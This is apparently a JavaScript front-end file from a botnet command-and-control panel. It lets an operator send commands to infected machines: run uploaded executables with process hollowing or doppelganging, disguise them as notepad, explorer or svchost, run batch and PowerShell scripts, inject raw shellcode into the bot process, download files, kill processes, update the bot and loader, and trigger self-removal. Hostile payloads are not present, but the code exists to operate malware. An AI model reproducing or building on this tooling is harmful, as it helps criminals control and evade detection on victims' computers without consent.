$(document).ready(function(){
	$('#timeoutselect').find('option[value=0]').attr('disabled', 'true');
});

function initcommand(){
	// trigger = change commandtype
	var comm = $('#commandtype').val();
	var tabs = ['runtype','timeout','mask','uploadfile','cmdline','scriptarea'];

	// set default all invisibles
	for(i=0;i<tabs.length;i++){
		$('#'+tabs[i]).addClass('hidetab');
	}
	// set values and selects to default
	// runtype
	if(comm == 'runbat' || comm == 'runpws'){
		$('#selectruntype').find('option[value=hollowing]').attr('disabled', 'true');
		$('#selectruntype').find('option[value=dopple]').attr('disabled', 'true');
		$('#selectruntype').find('option[value=create]').attr('disabled', 'true');
		$('#selectruntype').find('option[value=channel]').removeAttr('disabled');
    	$('#selectruntype').find('option[value=dump]').removeAttr('disabled');
    	$('#selectruntype').val('channel').trigger('change');
    	$('#selectFileUpLoad').attr('disabled','true'); // cant choice bat or pws file
	}else{
		$('#selectruntype').find('option[value=hollowing]').removeAttr('disabled');
		$('#selectruntype').find('option[value=dopple]').removeAttr('disabled');
		$('#selectruntype').find('option[value=create]').removeAttr('disabled');
		$('#selectruntype').find('option[value=channel]').attr('disabled', 'true');
    	$('#selectruntype').find('option[value=dump]').attr('disabled', 'true');
    	$('#selectruntype').val('hollowing').trigger('change');
    	$('#selectFileUpLoad').removeAttr('disabled');
	}

	

	// timeout
	$('#timeoutselect').val('60').trigger('change');

	// mask
	$('#selectmask').find('option[value=notepad]').removeAttr('disabled');
	$('#selectmask').find('option[value=explorer]').removeAttr('disabled');
	$('#selectmask').find('option[value=scvhost]').removeAttr('disabled');
	$('#selectmask').find('option[value=cmd]').removeAttr('disabled');
	$('#selectmask').val('notepad').trigger('change');

	// file upload
	$('.kv-upload-progress').css('display','none');
	$('#selectFileUpLoad').val('nofile').trigger('change');

	//cmdline and script
	$('#cmd').val('');
	$('#script').html('');

	
	
	// show tabs
	switch(comm){
		case 'nop':
			$('#timeout').removeClass('hidetab');
			$('.special_form').css('width','335px');
			$("#botcommandssearch-commandtype").val('0').trigger('change');
			$('#timeoutselect').find('option[value=0]').attr('disabled', 'true');
			break;
		case 'getinfo':
			$('#timeout').removeClass('hidetab');
			$('.special_form').css('width','335px');
			$("#botcommandssearch-commandtype").val('1').trigger('change');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
			
		case 'runexe':
			$('#runtype').removeClass('hidetab');
			$('#timeout').removeClass('hidetab');
			$('#mask').removeClass('hidetab');
			$('#uploadfile').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','100%');
			$("#botcommandssearch-commandtype").val('10').trigger('change');
			$('#cmdline-label').text('Parameters');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>command line parameters</b> of the binary');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'rundll':
			$('#timeout').removeClass('hidetab');
			$('#uploadfile').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$("#botcommandssearch-commandtype").val('11').trigger('change');
			$('#cmdline-label').text('Parameters');
			//$('.special_form').css('width','805px');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>command line parameters</b> of the binary');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'runbat':
			$('#runtype').removeClass('hidetab');
			$('#timeout').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('#uploadfile').removeClass('hidetab');
			$('#scriptarea').removeClass('hidetab');
			$('.special_form').css('width','100%');
			$("#botcommandssearch-commandtype").val('12').trigger('change');
			$('#cmdline-label').text('Script parameters');
			$('.script-label').text('Script');
			$('#w5 > div:nth-child(3)').html('<p><b>Place</b> your script to resizable box below</p><p>or</p><p><b>Upload</b> them in "Select/Upload execution file" section.</p>                    <p>Script will be appear in resizable box after being uploaded.</p><p>Your uploaded script not will be saved as execution file, but will be saved in command history table.');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>command line parameters</b> of the script');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'runpws':
			$('#runtype').removeClass('hidetab');
			$('#timeout').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('#uploadfile').removeClass('hidetab');
			$('#scriptarea').removeClass('hidetab');
			$('.special_form').css('width','100%');
			$("#botcommandssearch-commandtype").val('13').trigger('change');
			$('#cmdline-label').text('Script parameters');
			$('.script-label').text('Script');
			$('#w5 > div:nth-child(3)').html('<p><b>Place</b> your script to resizable box below</p><p>or</p><p><b>Upload</b> them in "Select/Upload execution file" section.</p>                    <p>Script will be appear in resizable box after being uploaded.</p><p>Your uploaded script not will be saved as execution file, but will be saved in command history table.');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>command line parameters</b> of the script');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'runcode':
			$('#scriptarea').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$("#botcommandssearch-commandtype").val('17').trigger('change');
			$('#cmdline-label').text('Code');
			$('.script-label').text('Shell Code');
			$('#w5 > div:nth-child(3)').html('<p>Please enter your shell code as hexadecimal uppercase string, up to 1M, like this:<br>AB CD EF 01 23 45 67 ..<br><p>Your shell code will be executed in the current process context (e.g. your bot).</p><p><b>BE EXTREMELY CAREFUL!<br>NO WARRANTY! ON YOUR OWN RISK!<br>WE RECOMMEND TO TEST IT FIRST IT IN CONTROLLED ENVIRONMENT!</b></p>');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>command line parameters</b> of the script');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'download':
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$("#botcommandssearch-commandtype").val('16').trigger('change');
			$('#cmdline-label').text('Filename with full path');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>full path</b> of the file, being downloaded');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'terminate':
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$("#botcommandssearch-commandtype").val('15').trigger('change');
			$('#cmdline-label').text('PID');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>PID</b> of the process, being terminated');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'suicide':
			$('.special_form').css('width','195px');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
			
		case 'updateloader32':
			$('#uploadfile').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$('#cmdline-label').text('Update version');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>version</b> of the binary here');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'updateloader64':
			$('#uploadfile').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$('#cmdline-label').text('Update version');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>version</b> of the binary here');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'updatebot32':
			$('#uploadfile').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$('#cmdline-label').text('Update version');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>version</b> of the binary here');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'updatebot64':
			$('#uploadfile').removeClass('hidetab');
			$('#cmdline').removeClass('hidetab');
			$('.special_form').css('width','390px');
			$('#cmdline-label').text('Update version');
			$('#options-area > div:nth-child(3) > p:nth-child(1)').html('Please enter the <b>version</b> of the binary here');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'updatenow':
			$('.special_form').css('width','390px');
			$('#uploadfile').removeClass('hidetab');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		case 'reset':
			$('.special_form').css('width','195px');
			$('#timeoutselect').find('option[value=0]').removeAttr('disabled');
			break;
		default:
			break;	
	
	}
	buildcommand();
}

function buildcommand(){
	// trigger = change any field or click GO
	var i = 0;
	// clear fields
	for (var n = 0; n <= 7; n++) {
		$('#bots-field'+n).val('');
	}
	// set values from tabs
	$('.selectcommand').each(function(){
		if(!$(this).parent().parent().hasClass('hidetab')){
			if($(this).val()!=null){
				
				$('#bots-field'+i).val($(this).val());
			}
		}
		i++;
	});
	// correct values 
	var command = $('#bots-field0').val();

	if(command=='runbat' || command=='runpws'){ // no URI and real file name for bat or pws
		$('#bots-field4').val('');
		$('#bots-field7').val('');
		/*if($('#bots-field6').val()!=''){
			var f6 = $('#bots-field6').val();
			$('#bots-field6').val('\\r\\n'+f6);
		}*/
	}
	if(command=='runexe' || command=='rundll' || command=='updateloader32' || command=='updateloader64' || command=='updatebot32' || command=='updatebot64' || command=='updatenow'){ // set URI for exe or dll
		if($("#selectFileUpLoad option:selected").text()!='nofile'){
			$('#bots-field7').val($("#selectFileUpLoad option:selected").text());
		}
	}
	if(command=='updatenow'){
		$('#bots-field1').val('update');
	}
}

$('#botFileLoad').on('fileuploaded', function(event, data, previewId, index) {
	// upload file
	// get response data
    var form = data.form, files = data.files, extra = data.extra,
        response = data.response, reader = data.reader;

    var result = Object.keys(response).map(function(key) {
	  return [Number(key), response[key]];
	});
	var f = result[0][1];
	var result = Object.keys(f).map(function(key) {
	  return [Number(key), f[key]];
	});
	var f = result[0][1];
	var result = Object.keys(f).map(function(key) {
	  return [Number(key), f[key]];
	});

	var extType = result[1][1];
	if(extType=='bat' || extType=='pws' || extType=='ps1'){
		$('#bots-field6').val(result[4][1]);
		$('#script').val(result[4][1]);
	}else{
		var storedName = result[0][1]; 				// 0 fileName
		var file_type = result[1][1]; 				// 1 ext
		var filesize = result[2][1]; 				// 2 size
		var realName = result[3][1]; 				// 3 originalName
		var filehash = result[4][1]; 				// 4 hash
		var fileid = result[5][1]; 					// 5 id
		var fileuploaded = result[6][1];			// 6 uploaded
		var admin = result[7][1]; 					// 7 admin

		var double_id = result[8][1]; 				// 8 double_id
		var double_filename = result[9][1];			// 9 doublefilename
		var double_admin = result[10][1];			// 10 double admin
		var double_size = result[11][1];			// 11 double_size
		var double_originalname = result[12][1]; 	// 12 double_originalname
		var double_hash = result[13][1];			// 13 double_hash
		var double_uploaded = result[14][1];		// 14 double uploaded
		
		last_id = storedName;
		
		if(storedName==null){
			storedName = '';
		}

		$('#bots-field4').val(storedName);
		$('#bots-field7').val(realName);

		// add new file list item
		var data = { id: storedName, text: realName	};

		var newOption = new Option(data.text, data.id, false, false);
		
		$('#selectFileUpLoad').append(newOption).trigger('change');
		$('#selectFileUpLoad').val(storedName).trigger('change');

    	// file_attr 'storedfilename','filename','size','created_at','hashmd5','login','id'

		file_attr.push(storedName,realName,filesize,fileuploaded,filehash,admin,fileid);

		// actions for md5 double
		if(double_originalname!=''){
			doublefiledialogue(double_id,double_filename,double_admin,double_size,double_originalname,double_hash,double_uploaded);
		}
	}

	// hide progressbar
	$('.kv-upload-progress').css('display','none');

	

	
});

$('body').on('fileuploaded', '#scvFileLoad', function(event, data, previewId, index) {
	// upload file
	// get response data
    var form = data.form, files = data.files, extra = data.extra,
        response = data.response, reader = data.reader;
	
    var result = Object.keys(response).map(function(key) {
	  return [Number(key), response[key]];
	});
	
	var f = result[0][1];
	var result = Object.keys(f).map(function(key) {
	  return [Number(key), f[key]];
	});
	var f = result[0][1];
	var result = Object.keys(f).map(function(key) {
	  return [Number(key), f[key]];
	});

	var extType = result[1][1];

	if(extType=='csv'){
		$('#sik-csvcontent').html(result[4][1]);
	}

	// hide progressbar
	//$('.kv-upload-progress').css('display','none');

	

	
});

$('#selectruntype').on('change', function(e) { // disable masks on create

    // selected values
    var vals = $(this).select2("val");

    var sm = $('select').not('#'+$(this).attr('id'));

    if(vals == 'create'){
    	$('#selectmask').find('option[value=notepad]').attr('disabled', 'true');
    	$('#selectmask').find('option[value=explorer]').attr('disabled', 'true');
    	$('#selectmask').find('option[value=scvhost]').attr('disabled', 'true');
    	$('#selectmask').find('option[value=cmd]').attr('disabled', 'true');
    	$('#selectmask').find('option[value=notuse]').removeAttr('disabled');
    	$('#selectmask').val('notuse').trigger('change');
    }else if(vals == 'dopple' || vals == 'hollowing'){
    	$('#selectmask').find('option[value=notuse]').attr('disabled', 'true');
    	$('#selectmask').val('notepad').trigger('change');
    	
    }else{
    	$('#selectmask').find('option[value=notepad]').removeAttr('disabled');
    	$('#selectmask').find('option[value=explorer]').removeAttr('disabled');
    	$('#selectmask').find('option[value=scvhost]').removeAttr('disabled');
    	$('#selectmask').find('option[value=cmd]').removeAttr('disabled');
    	$('#selectmask').find('option[value=notuse]').removeAttr('disabled');
    }
});

function repeatCommand(c){
	var comm = JSON.parse(c);

	// fix scripts
	if(comm[0]=='runbat' || comm[0]=='runpws'){
		var quote = comm[6].replace(/singlequotevk1zyS5/g, "'");
		var slash = quote.replace(/slashslash743io/g, "\\");
		var tab = slash.replace(/tabtab847264y/g, "\t");
		comm[6] = tab;
	}

	// set up menus
	$('#commandtype').val(comm[0]).trigger('change');
	$('#selectruntype').val(comm[1]).trigger('change');
	$('#timeoutselect').val(comm[2]).trigger('change');
	$('#selectmask').val(comm[3]).trigger('change');
	$("#selectFileUpLoad option").each(function() {
		this.selected = (this.text == comm[7]); 
	}).trigger('change');
	$('#cmd').val(comm[5]);
	$('#script').html(comm[6]);

	// fill fields
	
	for (var i = 0; i <= 7; i++) {
		$('#bots-field'+i).val(comm[i].trim());
	}
	
}



$("body").on( "mouseover", "#select2-selectFileUpLoad-results .select2-results__option", function(){
	var d = $(this).children().attr("class");
	var p = jQuery.inArray( d, file_attr );
	var res = '';
	res += "<a href='javascript:refreshfilelist()'>Refresh file list</a><br>";
	if(p >= 0){
		file_dd = file_attr[p];
		res += "<b>Name:</b>"+file_attr[p+1]+"<br>";
		res += "<b>Size:</b>"+file_attr[p+2]+"<br>";
		res += "<b>Uploaded:</b>"+file_attr[p+3]+"<br>";
		res += "<b>By user: </b> "+file_attr[p+5]+"<br>";
		res += "<b>Hash:</b>"+file_attr[p+4]+"<br>";
		res += "<a href='javascript:itemdeletedialogue()'>Delete this file</a>&nbsp;&nbsp;";
		
	}

	if($("#advanced-fileinfo").length==0){
		$( "<div id='advanced-fileinfo'>Test</div>" ).insertBefore( ".select2-search--dropdown" );
	}
	$("body #advanced-fileinfo").html(res);
	
} );

function autorefreshChanged(a){
	alert(a)
	/*$.ajax({
	  method: "POST",
	  async: false,
	  url: "/bots/autorefreshchanged?id="+id
	});*/
}


function itemdeletedialogue(){
	$("#fastdeletemodalmask").show();
	$("#fastdeletemodal").show();
}

$("#fastdeletemodalcancel").click(function(){
	$("#fastdeletemodalmask").hide();
	$("#fastdeletemodal").hide();
});

$("#fastdeletemodalclose").click(function(){
	$("#fastdeletemodalmask").hide();
	$("#fastdeletemodal").hide();
});

$("#fastdeletemodalok").click(function(){
	$("#fastdeletemodalmask").hide();
	$("#fastdeletemodal").hide();
	itemdelete(file_dd);
});

function itemdelete(item){
	// delete from select
	$('#selectFileUpLoad option[value="'+item+'"]').remove().trigger('change');
	
	// delete from file_attr array
	var j = file_attr.indexOf(item)
	var id = file_attr[j+6];
	file_attr.splice(j,7);
	
	// delete file
	$.ajax({
	  method: "POST",
	  async: false,
	  url: "/files/delete?id="+id
	});
}

function doublefiledialogue(p0,p1,p2,p3,p4,p5,p6){
	$("#doublefilemodalmask").show();
	$("#doublefilemodal").show();
	var res = '';
	res += "<b>Name:</b>"+p4+"<br>";
	res += "<b>Size:</b>"+p3+"<br>";
	res += "<b>Uploaded:</b>"+p6+"<br>";
	res += "<b>By user: </b> "+p2+"<br>";
	res += "<b>Hash:</b>"+p5+"<br>";
	$("body #doublefileinfo").html(res);
}

$("#doublefilemodalcancel").click(function(){
	$("#doublefilemodalmask").hide();
	$("#doublefilemodal").hide();
});

$("#fastdeletemodalclose").click(function(){
	$("#doublefilemodalmask").hide();
	$("#doublefilemodal").hide();
	itemdelete(last_id);
});

$("#doublefilemodalok").click(function(){
	$("#doublefilemodalmask").hide();
	$("#doublefilemodal").hide();
});

$('#mainform').submit(function(){
	if($('#bots-field0').val()=='runexe' || $('#bots-field0').val()=='rundll' || $('#bots-field0').val()=='updatenow' || $('#bots-field0').val()=='updatebot64' || $('#bots-field0').val()=='updatebot86' || $('#bots-field0').val()=='updateloader64' || $('#bots-field0').val()=='updateloader86'){
		if($('#bots-field4').val()=='' || $('#bots-field4').val()=='nofile'){
			$("#errormodalmask").show();
			$("#errormodal").show();
			return false;
		}
	}
	if($('#bots-field0').val()=='runbat' || $('#bots-field0').val()=='runpws' || $('#bots-field0').val()=='runcode'){
		if($('#bots-field6').val()==''){
			$("#errormodalmask").show();
			$("#errormodal").show();
			return false;
		}
	}
});

$("#errormodalcancel").click(function(){
	$("#errormodalmask").hide();
	$("#errormodal").hide();
});


function refreshfilelist(){
	$.ajax({
	  method: "POST",
	  dataType: "json",
	  url: "/files/getgroupfiles?id="+$('#botgroup').text(),
	  success:function(data){
	  	
	  	var result = Object.keys(data).map(function(key) {
		  return [Number(key), data[key]];
		});

	  	// clear previous options
	  	file_attr = new Array();
		$('#selectFileUpLoad option').each(function(){
			$("#selectFileUpLoad option[value='"+$(this).val()+"']").remove().trigger('change');
		});

		// Create first option
		var data = { id: 'nofile', text: '...'	};
		var newOption = new Option(data.text, data.id, false, false);
		$('#selectFileUpLoad').append(newOption).trigger('change');

		var res = '';
		for (var i = 0; i < result.length; i++) {

			// new file list create
			s = result[i];
			for (var j = 0; j < s[1].length; j++) {
				file_attr.push(s[1][j]); 
		  	}

		  	// add new file list item
			var data = { id: s[1][0], text: s[1][1]	};
			var newOption = new Option(data.text, data.id, false, false);
			$('#selectFileUpLoad').append(newOption).trigger('change');
		
	  	}
	  	$('#selectFileUpLoad').val('nofile').trigger('change');
	  }
	});
}
